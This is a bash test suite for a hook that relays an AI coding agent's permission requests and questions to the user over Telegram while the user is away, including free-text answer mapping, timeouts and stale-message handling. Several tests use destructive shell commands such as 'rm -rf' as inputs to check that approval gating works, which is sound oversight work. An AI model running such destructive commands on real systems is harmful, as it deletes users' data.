    assert_eq "0" "$rc" "git with destructive args still matches safe pattern"
    assert_file_not_exists "$MOCK_AFD_LOG" "should not trigger approval for git"
}
run_test "edge case: git push --force still allowed (safe pattern)" test_git_is_safe_even_with_destructive_args

test_env_var_prefixed_safe_command_not_matched() {
    # Commands like "VAR=x ls" would not match "^ls " pattern
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "FOO=bar ls /tmp")
    local rc=0
    run_hook_with "$json" || rc=$?
    # "FOO=bar ls" starts with "FOO", not "ls" — not in safe list
    assert_file_exists "$MOCK_AFD_LOG" "env-prefixed command should not match safe pattern"
}
run_test "edge case: env var prefix prevents safe match" test_env_var_prefixed_safe_command_not_matched

# ── Stderr messages ─────────────────────────────────────────────────────────

test_stderr_requesting_approval_message() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "rm -rf /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_contains "$HOOK_STDERR" "requesting approval" "should report requesting approval on stderr"
}
run_test "stderr: requesting approval message" test_stderr_requesting_approval_message

test_stderr_waiting_message() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "rm -rf /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_contains "$HOOK_STDERR" "Waiting for approval" "should report waiting on stderr"
}
run_test "stderr: waiting for approval message" test_stderr_waiting_message

test_stderr_notification_failure_message() {
    setup_mock_home
    set_afk
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "no valid output"
    exit 1
fi
EOF
    local json
    json=$(make_json "Bash" "rm -rf /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_contains "$HOOK_STDERR" "Failed to send permission request" "should report notification failure"
}
run_test "stderr: notification failure message" test_stderr_notification_failure_message

# ── Multiple sequential safe commands (state isolation) ─────────────────────

test_multiple_safe_commands_no_approval() {
    setup_mock_home
    set_afk
    # Run multiple safe commands — none should trigger approval
    for cmd in "ls /tmp" "cat /etc/hostname" "git status" "echo hello" "date +%s"; do
        local json
        json=$(make_json "Bash" "$cmd")
        local rc=0
        run_hook_with "$json" || rc=$?
        assert_eq "0" "$rc" "safe command '$cmd' should exit 0"
    done
    assert_file_not_exists "$MOCK_AFD_LOG" "no afd calls for safe commands"
}
run_test "multiple safe commands: no approval triggered" test_multiple_safe_commands_no_approval

# ── AskUserQuestion AFK answering (CFG-323) ────────────────────────────────

test_ask_user_question_allowed_when_not_afk() {
    setup_mock_home
    local json
    json=$(make_json "AskUserQuestion" "" "")
    # Override: AskUserQuestion input has "question" not "command"
    json='{"tool_name":"AskUserQuestion","tool_input":{"question":"What branch?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "AskUserQuestion should be allowed when not AFK"
    assert_eq "" "$HOOK_STDOUT" "no stdout when not AFK"
}
run_test "AskUserQuestion: allowed when not AFK" test_ask_user_question_allowed_when_not_afk

test_ask_user_question_routed_to_telegram_when_afk() {
    setup_mock_home
    touch "$MOCK_HOME/.afd-afk"
    # Mock afd that logs calls and returns a fake notification ID
    cat > "$MOCK_AFD" << 'MOCK'
#!/usr/bin/env bash
echo "$@" >> "$HOME/.afd-calls.log"
if [[ "$1" == "notify" ]]; then
    echo "Notification sent #42"
elif [[ "$1" == "poll" ]]; then
    echo "What branch? Use main"
fi
MOCK
    chmod +x "$MOCK_AFD"
    local json='{"tool_name":"AskUserQuestion","tool_input":{"question":"What branch should I deploy to?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    # CFG-768: the answer goes back to the model as the block reason (exit 2 +
    # stderr). The old updatedInput:{question:<answer>} overwrote the question
    # with the answer and is validated as tool input from CC 2.1.300.
    assert_eq "2" "$rc" "answer is handed to the model via exit 2"
    # Verify the question was sent to Telegram
    assert_file_exists "$MOCK_HOME/.afd-calls.log"
    assert_file_contains "$MOCK_HOME/.afd-calls.log" "notify"
    assert_file_contains "$MOCK_HOME/.afd-calls.log" "What branch should I deploy to?"
    # CFG-708: the question must go to Telegram, not the default 'all' broadcast
    assert_file_contains "$MOCK_HOME/.afd-calls.log" "--channel telegram"
    assert_contains "$HOOK_STDERR" "What branch? Use main"
    assert_contains "$HOOK_STDERR" "answered via Telegram"
}
run_test "AskUserQuestion: routed to Telegram when AFK" test_ask_user_question_routed_to_telegram_when_afk

# 2026-10-20: the hint named the full project; suggest the short tag that routes.
test_ask_user_question_hint_uses_short_tag() {
    setup_mock_home
    touch "$MOCK_HOME/.afd-afk"
    mkdir -p "$MOCK_HOME/config-repo" "$MOCK_HOME/other"
    git -C "$MOCK_HOME/config-repo" init -q
    local json
    json=$(printf '{"tool_name":"AskUserQuestion","cwd":"%s","tool_input":{"question":"Which?"}}' "$MOCK_HOME/config-repo")
    run_hook_with "$json" env -u AFD_PROJECT_ROOTS AFD_AFK_POLL_INTERVAL=1 || true
    assert_file_contains "$MOCK_AFD_LOG" "start with @con " "the hint names the shortest routing tag"
}
run_test "AskUserQuestion: Telegram hint uses the short project tag" test_ask_user_question_hint_uses_short_tag

test_ask_user_question_denied_on_timeout() {
    setup_mock_home
    touch "$MOCK_HOME/.afd-afk"
    cat > "$MOCK_AFD" << 'MOCK'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "Notification sent #42"
elif [[ "$1" == "poll" ]]; then
    exit 1  # timeout
fi
MOCK
    chmod +x "$MOCK_AFD"
    local json='{"tool_name":"AskUserQuestion","tool_input":{"question":"Continue?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should deny on poll timeout"
}
run_test "AskUserQuestion: denied on poll timeout" test_ask_user_question_denied_on_timeout

# CFG-772(b): 'afk off' while a question waits must release the session at once,
# instead of leaving it blocked until the hour runs out.
test_ask_user_question_released_on_afk_off() {
    setup_mock_home
    touch "$MOCK_HOME/.afd-afk"
    cat > "$MOCK_AFD" << 'MOCK'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then echo "Notification sent #42"; fi
exit 0
MOCK
    chmod +x "$MOCK_AFD"
    ( sleep 1; rm -f "$MOCK_HOME/.afd-afk" ) &
    local json='{"tool_name":"AskUserQuestion","tool_input":{"question":"Continue?"}}'
    local rc=0 t0=$SECONDS
    HOOK_AFK_TIMEOUT=30 AFD_AFK_POLL_INTERVAL=1 run_hook_with "$json" || rc=$?
    local took=$(( SECONDS - t0 ))
    wait
    assert_eq "2" "$rc" "released question returns control to the model"
    [[ $took -le 6 ]] && ok=0 || ok=1
    assert_eq "0" "$ok" "released within 6 s of 'afk off' (took ${took}s)"
    [[ "$HOOK_STDERR" == *"ask"* && "$HOOK_STDERR" == *"AFK"* ]] && ok=0 || ok=1
    assert_eq "0" "$ok" "tells the model to ask again in the console (stderr: ${HOOK_STDERR##*$'\n'})"
}
run_test "AskUserQuestion: released when AFK is switched off mid-wait" test_ask_user_question_released_on_afk_off

test_ask_user_question_denied_when_no_afd() {
    setup_mock_home
    touch "$MOCK_HOME/.afd-afk"
    rm -f "$MOCK_AFD"  # no afd CLI
    local json='{"tool_name":"AskUserQuestion","tool_input":{"question":"Continue?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should deny when afd CLI missing"
}
run_test "AskUserQuestion: denied when afd CLI missing" test_ask_user_question_denied_when_no_afd

# ── Auto mode: no Bash relay (CFG-768, 2026-10-18) ──────────────────────────
# CC sends permission_mode in the hook input. In auto mode CC's classifier gates
# Bash; a Telegram relay on top only produced prompts the 60 s hook timeout
# abandoned (fail-open), so the command ran anyway and the prompt gated nothing.

test_auto_mode_bash_not_relayed() {
    setup_mock_home
    set_afk
    local json='{"tool_name":"Bash","permission_mode":"auto","tool_input":{"command":"rm -rf /tmp/something"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "auto mode: Bash allowed without relay"
    local calls
    calls=$(grep -c '^notify' "$MOCK_AFD_LOG" 2>/dev/null || true)
    assert_eq "0" "${calls:-0}" "auto mode: no Telegram notify sent (got ${calls:-0})"
}
run_test "auto mode: dangerous Bash in AFK is not relayed" test_auto_mode_bash_not_relayed

test_default_mode_bash_still_relayed() {
    setup_mock_home
    set_afk
    local json='{"tool_name":"Bash","permission_mode":"default","tool_input":{"command":"rm -rf /tmp/something"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    local calls
    calls=$(grep -c '^notify' "$MOCK_AFD_LOG" 2>/dev/null || true)
    assert_eq "1" "${calls:-0}" "default mode: relay still sends one notify (got ${calls:-0})"
}
run_test "default mode: dangerous Bash in AFK is still relayed" test_default_mode_bash_still_relayed

test_auto_mode_ask_user_question_still_relayed() {
    setup_mock_home
    set_afk
    local json='{"tool_name":"AskUserQuestion","permission_mode":"auto","tool_input":{"question":"Continue?"}}'
    local rc=0
    run_hook_with "$json" || rc=$?
    local calls
    calls=$(grep -c '^notify' "$MOCK_AFD_LOG" 2>/dev/null || true)
    assert_eq "1" "${calls:-0}" "auto mode: AskUserQuestion still routed (got ${calls:-0})"
}
run_test "auto mode: AskUserQuestion is still relayed" test_auto_mode_ask_user_question_still_relayed

# ── AskUserQuestion: free-text Telegram answers (CFG-768, 2026-10-18) ───────
# The server only links a 4-letter code or "d" to a pending notification; free
# text becomes a plain message that `afd messages` hands to whoever polls first.
# The waiting hook must take its answer from the message queue itself.

# Mock afd: notify -> #77; poll -> no response; messages -> $HOME/pending.jsonl once.
mock_afd_with_messages() {
    export AFD_MSG_DIR="$MOCK_HOME/.afd-msgs" AFD_AFK_POLL_INTERVAL=0
    unset AFD_PROJECT_ROOTS   # the live settings env must not leak into the sandbox
    set_mock_afd << 'MOCK'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
case "$1" in
  notify) echo "Notification #77 sent to all" ;;
  poll) exit 1 ;;
  messages) [[ -f "$HOME/pending.jsonl" ]] && { cat "$HOME/pending.jsonl"; rm -f "$HOME/pending.jsonl"; } ;;
esac
exit 0
MOCK
}

ask_json() { # ask_json <cwd>
    python3 -c 'import json,sys; print(json.dumps({"tool_name":"AskUserQuestion","cwd":sys.argv[1],"tool_input":{"questions":[{"question":"Add the caveat to P4?","header":"P4","multiSelect":False,"options":[{"label":"Add","description":"x"},{"label":"Skip","description":"y"}]}]}}))' "$1"
}

# CFG-773: the answer goes back through updatedInput.answers with permissionDecision
# allow, so CC shows it as the user's answer instead of "PreToolUse hook error".
ask_answer() { # ask_answer <question text> — the answer for it in $HOOK_STDOUT
    printf '%s' "$HOOK_STDOUT" | python3 -c 'import json,sys; d=json.load(sys.stdin)["hookSpecificOutput"]; print(d["updatedInput"]["answers"].get(sys.argv[1],"")) if d.get("permissionDecision")=="allow" else print("")' "$1" 2>/dev/null
}
ask2_json() { # two questions
    python3 -c 'import json,sys; print(json.dumps({"tool_name":"AskUserQuestion","cwd":sys.argv[1],"tool_input":{"questions":[{"question":"Q one?","header":"A","multiSelect":False,"options":[{"label":"A1","description":"x"},{"label":"A2","description":"y"}]},{"question":"Q two?","header":"B","multiSelect":False,"options":[{"label":"B1","description":"x"},{"label":"B2","description":"y"},{"label":"B3","description":"z"}]}]}}))' "$1"
}
ask_reply() { # ask_reply <json-builder> <message> — run the relay with one queued reply
    setup_mock_home; set_afk; mock_afd_with_messages
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    python3 -c 'import json,sys; print(json.dumps({"id":97,"message":sys.argv[1],"timestamp":"t","persona":"Bot"}))' "$2" > "$MOCK_HOME/pending.jsonl"
    ASK_RC=0
    run_hook_with "$($1 "$proj")" || ASK_RC=$?
}

test_ask_free_text_answer() {
    setup_mock_home
    set_afk
    mock_afd_with_messages
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    printf '%s\n' '{"id":90,"message":"@alpha add","timestamp":"t","persona":"Bot"}' > "$MOCK_HOME/pending.jsonl"
    local rc=0
    run_hook_with "$(ask_json "$proj")" || rc=$?
    assert_eq "0" "$rc" "answer delivered as an allowed tool call, not a hook error (rc=$rc)"
    assert_eq "Add" "$(ask_answer "Add the caveat to P4?")" "a reply matching an option label (any case) becomes that label, @prefix stripped (stdout: $HOOK_STDOUT)"
}
run_test "AskUserQuestion: free-text Telegram reply is taken as the answer" test_ask_free_text_answer

test_ask_digit_maps_to_label() {
    ask_reply ask_json "@alpha 2"
    assert_eq "0" "$ASK_RC" "allowed"
    assert_eq "Skip" "$(ask_answer "Add the caveat to P4?")" "digit N = option N's label"
    assert_contains "$HOOK_STDOUT" '"questions"' "the original questions are passed through"
}
run_test "AskUserQuestion: a digit reply becomes that option's label" test_ask_digit_maps_to_label

test_ask_free_text_other() {
    ask_reply ask_json "@alpha only after the review"
    assert_eq "only after the review" "$(ask_answer "Add the caveat to P4?")" "free text is passed as an 'Other' answer"
}
run_test "AskUserQuestion: free text becomes an Other answer" test_ask_free_text_other

test_ask_multi_digits() {
    ask_reply ask2_json "@alpha 2 3"
    assert_eq "A2" "$(ask_answer "Q one?")" "first digit answers the first question"
    assert_eq "B3" "$(ask_answer "Q two?")" "second digit answers the second"
}
run_test "AskUserQuestion: one digit per question maps each" test_ask_multi_digits

test_ask_multi_unmappable_falls_back() {
    ask_reply ask2_json "@alpha yes to both"
    assert_eq "2" "$ASK_RC" "cannot map one reply to two questions: old exit-2 delivery"
    assert_contains "$HOOK_STDERR" "yes to both" "with the reply text"
}
run_test "AskUserQuestion: an unmappable multi-question reply falls back to exit 2" test_ask_multi_unmappable_falls_back

test_ask_digit_out_of_range_is_text() {
    ask_reply ask_json "@alpha 7"
    assert_eq "7" "$(ask_answer "Add the caveat to P4?")" "a digit with no such option stays literal text"
}
run_test "AskUserQuestion: out-of-range digit stays literal" test_ask_digit_out_of_range_is_text

test_ask_ignores_other_projects_message() {
    setup_mock_home
    set_afk
    mock_afd_with_messages
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    mkdir -p "$MOCK_HOME/beta"
    printf '%s\n' '{"id":91,"message":"@beta hello","timestamp":"t","persona":"Bot"}' > "$MOCK_HOME/pending.jsonl"
    local rc=0
    HOOK_AFK_TIMEOUT=1 run_hook_with "$(ask_json "$proj")" || rc=$?
    assert_not_contains "$HOOK_STDERR" "hello" "another project's message is not an answer (stderr: $HOOK_STDERR)"
    assert_file_contains "$MOCK_HOME/.afd-msgs/beta.jsonl" "@beta hello" "it is queued for its project instead"
}
run_test "AskUserQuestion: a message for another project is not the answer" test_ask_ignores_other_projects_message

test_ask_sends_current_schema_question() {
    setup_mock_home
    set_afk
    mock_afd_with_messages
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    printf '%s\n' '{"id":92,"message":"skip","timestamp":"t","persona":"Bot"}' > "$MOCK_HOME/pending.jsonl"
    run_hook_with "$(ask_json "$proj")" || true
    assert_file_contains "$MOCK_AFD_LOG" "Add the caveat to P4?" "questions[] text is sent (current CC schema)"
    assert_file_contains "$MOCK_AFD_LOG" "Skip" "option labels are sent"
    assert_file_contains "$MOCK_AFD_LOG" "[alpha]" "the asking project is named"
}
run_test "AskUserQuestion: current questions[] schema and project are sent" test_ask_sends_current_schema_question


# ── Summary ─────────────────────────────────────────────────────────────────


test_ask_ignores_stale_queued_message() {
    setup_mock_home
    set_afk
    mock_afd_with_messages
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    mkdir -p "$AFD_MSG_DIR"
    printf '%s\n' '{"id":5,"message":"old chatter","timestamp":"t","persona":"Bot"}' > "$AFD_MSG_DIR/alpha.jsonl"
    printf '%s\n' '{"id":80,"message":"skip","timestamp":"t","persona":"Bot"}' > "$MOCK_HOME/pending.jsonl"
    local rc=0
    run_hook_with "$(ask_json "$proj")" || rc=$?
    assert_eq "Skip" "$(ask_answer "Add the caveat to P4?")" "only a message newer than the question answers it (stdout: $HOOK_STDOUT)"
    assert_file_contains "$AFD_MSG_DIR/alpha.jsonl" "old chatter" "the older message stays queued"
}
run_test "AskUserQuestion: a message older than the question is not its answer" test_ask_ignores_stale_queued_message

test_ask_takes_untagged_reply_while_waiting() {
    setup_mock_home
    set_afk
    mock_afd_with_messages
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    # An untagged reply consumed by ANOTHER session must reach the single waiting session.
    mkdir -p "$AFD_MSG_DIR/.waiting"; echo "$$ 70" > "$AFD_MSG_DIR/.waiting/alpha"
    ( source "$REPO_ROOT/global/hooks/lib-afd-msg.sh"
      printf '%s\n' '{"id":81,"message":"add","timestamp":"t","persona":"Bot"}' > "$MOCK_HOME/pending.jsonl"
      HOME="$MOCK_HOME" afd_route_messages "config-repo" >/dev/null )
    assert_file_contains "$AFD_MSG_DIR/alpha.jsonl" '"add"' "untagged reply routed to the waiting project"
}
run_test "untagged reply goes to the single session waiting on a question" test_ask_takes_untagged_reply_while_waiting

test_ask_declined_with_d() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
case "$1" in notify) echo "Notification #78 sent to all" ;; poll) echo denied ;; esac
exit 0
MOCK
    local rc=0
    run_hook_with '{"tool_name":"AskUserQuestion","tool_input":{"question":"Go?"}}' || rc=$?
    assert_eq "2" "$rc" "declined question blocks (rc=$rc)"
    assert_contains "$HOOK_STDERR" "declined" "the model is told the user declined"
}
run_test "AskUserQuestion: 'd' on Telegram declines" test_ask_declined_with_d

test_ask_waiting_marker_removed() {
    setup_mock_home
    set_afk
    mock_afd_with_messages
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    printf '%s\n' '{"id":93,"message":"ok","timestamp":"t","persona":"Bot"}' > "$MOCK_HOME/pending.jsonl"
    run_hook_with "$(ask_json "$proj")" || true
    assert_file_not_exists "$AFD_MSG_DIR/.waiting/alpha" "waiting marker removed after the answer"
}
run_test "AskUserQuestion: waiting marker is cleaned up" test_ask_waiting_marker_removed

test_settings_timeout_exceeds_hook_wait() {
    local got
    got=$(python3 -c "
import json
s = json.load(open('$REPO_ROOT/setup/config/settings.json'))
t = [h.get('timeout', 0) for g in s['hooks'].get('PreToolUse', []) for h in g['hooks'] if 'afd-relay.sh' in h['command']]
print(min(t) if t else 0)")
    [[ "$got" -ge 3660 ]] && ok=0 || ok=1
    assert_eq "0" "$ok" "every afd-relay registration outlasts the 3600 s wait by >= 60 s (min timeout: $got)"
}
run_test "settings: afd-relay hook timeout outlasts its own wait" test_settings_timeout_exceeds_hook_wait

# CFG-776: busy sessions see the hint too (PreToolUse fires on every tool call),
# as additionalContext JSON — plain PreToolUse stdout never reaches the model.
test_relay_reports_stale_foreign_queue() {
    setup_mock_home
    mkdir -p "$MOCK_HOME/.afd-msgs"
    echo '{"id":379,"message":"@aiware hi","timestamp":"t","persona":"Bot"}' > "$MOCK_HOME/.afd-msgs/aiware.jsonl"
    touch -d '-2 minutes' "$MOCK_HOME/.afd-msgs/aiware.jsonl"
    local json='{"tool_name":"Read","session_id":"s1","cwd":"/tmp/proj","tool_input":{"file_path":"/x"}}'
    local rc=0
    AFD_MSG_DIR="$MOCK_HOME/.afd-msgs" run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "the tool call is still allowed"
    local ctx
    ctx=$(printf '%s' "$HOOK_STDOUT" | python3 -c "import sys,json; print(json.load(sys.stdin)['hookSpecificOutput']['additionalContext'])" 2>/dev/null)
    assert_contains "$ctx" "@aiware: #379" "additionalContext names the stuck queue (stdout: $HOOK_STDOUT)"
}
run_test "relay: undelivered foreign queue reported as additionalContext" test_relay_reports_stale_foreign_queue

test_relay_silent_without_queues() {
    setup_mock_home
    local json='{"tool_name":"Read","session_id":"s1","cwd":"/tmp/proj","tool_input":{"file_path":"/x"}}'
    local rc=0
    AFD_MSG_DIR="$MOCK_HOME/.afd-msgs" run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "allowed"
    assert_eq "" "$HOOK_STDOUT" "no queues: empty stdout (fast path)"
}
run_test "relay: no queues, no output" test_relay_silent_without_queues


# Review finding (2026-10-20): the marker names the relay's pid so a dead relay's marker
# can be told apart, and a relay whose Claude Code process is gone stops waiting.
test_ask_marker_records_relay_pid() {
    setup_mock_home
    set_afk
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    set_mock_afd << 'MOCK'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
case "$1" in
  notify) echo "Notification #95 sent to all" ;;
  poll) cat "$AFD_MSG_DIR/.waiting/alpha" > "$HOME/marker.seen" 2>/dev/null; echo "fine" ;;
esac
exit 0
MOCK
    run_hook_with "$(ask_json "$proj")" || true
    local m; m=$(cat "$MOCK_HOME/marker.seen" 2>/dev/null)
    assert_contains "$m" " 95" "marker carries the question id (marker: $m)"
    [[ "${m%% *}" =~ ^[0-9]+$ ]] && r=0 || r=1
    assert_eq "0" "$r" "marker starts with the relay pid (marker: $m)"
}
run_test "AskUserQuestion: waiting marker records the relay pid" test_ask_marker_records_relay_pid

test_ask_stops_when_cc_gone() {
    setup_mock_home
    set_afk
    local proj="$TEST_TMPDIR/Alpha"; mkdir -p "$proj"; git -C "$proj" init -q
    set_mock_afd << 'MOCK'
#!/usr/bin/env bash
case "$1" in notify) echo "Notification #96 sent to all" ;; esac
exit 0
MOCK
    local dead; sleep 0 & dead=$!; wait "$dead"
    local rc=0 t0=$SECONDS
    HOOK_AFK_TIMEOUT=30 run_hook_with "$(ask_json "$proj")" env AFD_RELAY_PARENT_PID="$dead" AFD_AFK_POLL_INTERVAL=1 || rc=$?
    assert_eq "2" "$rc" "the relay stops (rc=$rc)"
    [[ $(( SECONDS - t0 )) -le 10 ]] && r=0 || r=1
    assert_eq "0" "$r" "within seconds, not at the timeout (took $(( SECONDS - t0 ))s)"
    assert_file_not_exists "$AFD_MSG_DIR/.waiting/alpha" "and leaves no marker"
}
run_test "AskUserQuestion: relay stops when its Claude Code process is gone" test_ask_stops_when_cc_gone

test_ask_hint_untagged_when_unroutable() {
    setup_mock_home
    set_afk
    local proj="$TEST_TMPDIR/deep/NotUnderRoots"; mkdir -p "$proj"; git -C "$proj" init -q
    local json; json=$(printf '{"tool_name":"AskUserQuestion","cwd":"%s","tool_input":{"question":"Which?"}}' "$proj")
    run_hook_with "$json" env -u AFD_PROJECT_ROOTS AFD_AFK_POLL_INTERVAL=1 || true
    assert_file_not_contains "$MOCK_AFD_LOG" "start with @notunderroots" "no tag advertised that would not route"
}
run_test "AskUserQuestion: no tag hint when the project does not route" test_ask_hint_untagged_when_unroutable

suite_summary
